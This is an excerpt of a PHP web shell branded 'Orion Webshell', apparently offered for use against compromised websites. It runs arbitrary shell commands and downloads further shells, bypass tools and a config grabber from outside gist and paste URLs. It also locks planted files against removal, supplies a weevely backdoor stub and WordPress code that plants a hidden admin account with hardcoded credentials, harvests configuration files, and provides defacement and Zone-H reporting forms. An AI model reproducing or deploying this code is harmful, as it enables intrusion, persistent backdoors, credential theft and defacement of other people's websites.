...
<html>
	<head>
		<meta charset='utf-8'>
		<meta name='author' content='Orion Webshell'>
...
<a class='text-decoration-none text-light anu' href='" .$_SERVER["PHP_SELF"] ."'><h1>Orion Webshell | OrionTeam1337</h1></a>";
if (isset($_1337["path"])) {
    $path = $_1337["path"];
    chdir($path);
} else {
...
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['lockfile'])) {
    ...
    if ($tmpnya) {
        ...
        while (true) {
            ...
            if (orionperm("' . getcwd() . '/' . $namafilelos . '") != 0444) {
                chmod("' . getcwd() . '/' . $namafilelos . '", 0444);
            }
        }

        function orionperm($filename) {
...
if (isset($_POST['get'])) {
    ...
    if ($_POST['option'] == '1') {
        ...
        $fileName = getcwd() . '/orionadminer.php';
...
ErrorDocument 403 \"<html><head><title>Request Rejected by orion</title></head><body>The requested URL was rejected. Please consult with your administrator.</body></html>\"
ErrorDocument 404 \"<html><head><title>Request Rejected by orion</title></head><body>The requested URL was rejected. Please consult with your administrator.</body></html>\"");
        ?></code></pre>
...
$T=$u('',$r);$T();
    ...
    <p class="text-center">How to use? Just paste the code above in the php file, for example: index.php etc. then connect to weevely | terminal command: <em>weevely http://yoursite/yourfile.php orion</em><p>

				</div><?php
    } elseif ($_POST['option'] == '4') {
        $url = 'https://gist.github.com/YumiProjects/138a42932c8261849e7b9c8639b5689d/raw/4a99b93b3591e6151514a4e0993650833e75d88f/lol.shtml';
        $fileName = getcwd() . '/orion-ssi.shtml';
    } elseif ($_POST['option'] == '5') {?>
<div class="container-fluid language-javascript mt-3">
        <div class="shell mb-3 position-relative"><pre style="font-size:10px;" id="code"><code>function orionadmin(){
$login = 'orion';
$passw = 'OrionProject1337';
$email = 'orionlaper@proton.me';
...
add_action('init','orionadmin');</code></pre>
<button class="btn btn-danger btn-sm copy-button" onclick="copyToClipboard()">Copy</button>
</div>
<p class="text-center">How to use? Add the above code in the functions.php file on the target website. | example: https://example.go.id/wp-content/themes/[themes name]/functions.php</p>
        ...
        $url = 'https://gist.githubusercontent.com/YumiProjects/37fe28c956cac2a4b04bb87ae32a2f80/raw/a7cd911d3f463279f3ccda3d235518bc6fb6686e/alfa_byp.php';
        $fileName = getcwd() . '/orion-alfabepas.php';
    } elseif ($_POST['option'] == '7') {
        $url = 'https://gist.githubusercontent.com/YumiProjects/ef82bd70aa4318ec1768e8025be9acbe/raw/28fb54c69e3f590e2ebfa460c9a2b1fdd6a5e344/marijuana.php';
        $fileName = getcwd() . '/orion-marijuana.php';
    } elseif ($_POST['option'] == '8') {
        $url = 'https://raw.githubusercontent.com/FlamXTna997/Priv8-Config-Grabber/master/config.php';
        $fileName = getcwd() . '/orion-config.php';
    } elseif ($_POST['option'] == '9') {
        $url = 'https://pst.innomi.net/paste/uo6cf3k4frw53f2rn9jot7fh/raw';
        $fileName = getcwd() . '/orion-tesla.php';
    } elseif ($_POST['option'] == '10') {
        $url = 'https://paste.idcloudhosting.my.id/paste/ofp7w/raw';
        $fileName = getcwd() . '/orion-bypasslitespeed.php';
...
database.php";
    ...
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['sepconfig']) && isset($_POST['target_files'])) {
        $outputFilename = basename('orionconfigresult.txt');
    ...
    if ($_1337["id"] == "zoneh") {
        ...
        if ($_POST["submit"]) {
            ...
            <i class="bi bi-person"></i> Attacker Name: 
                <input type="text" class="form-control btn-sm text-dark" name="nick" size="50" placeholder="orion" id="nick">
    ...
    <div class='card card-body mb-3' style='background-color: #ffffff;'>
        <form method='POST' id='symlinkForm'>
            ...
            <div class='d-grid gap-2'>
                ...
                <select class='form-control btn-sm text-dark' name='achonorionju5t'>
    ...
    if ($_1337["id"] == "deface") {
		...
		<div class='card card-body text-dark input-group mb-3'>
			...
			<div class='form-check'>
				...
				<input class='form-control btn-sm text-dark' type='text' name='d_file' placeholder='orion.txt'>
				<i class='bi bi-code-square'></i> Your Script:
				<textarea class='form-control btn-sm text-dark' rows='7' name='script' placeholder='Hacked by orion'></textarea>
				<div class='d-grid gap-2'>
...
echo `$command`;
    ...
    <div class="form-group d-flex align-items-center">
        <input type="text" class="form-control form-control-sm text-dark flex-grow-1" placeholder="https://example.go.id/files/orionprivate.txt" name="url" id="url" required>
...
if (isset($_1337["filenew"])) {
    ...
    echo "
		<div class='mb-3'>
			<form method='POST'>
				<i class='bi bi-file-earmark'></i> Filename:
				<input class='form-control form-control-sm text-dark' type='text' name='name_file[]' placeholder='orion.txt' $_r>
				<i class='bi bi-code-square'></i> Your Script:
				<textarea class='form-control form-control-sm text-dark' name='contents_file' rows='7' placeholder='Hacked by orion' $_r></textarea>
				<div class='d-grid gap-2'><br>
...
echo "</tbody></table></div><center><div class='text-white'><hr><font color='white'>&copy; INDONESIA GELAP</font></div></center></body></html>";
?>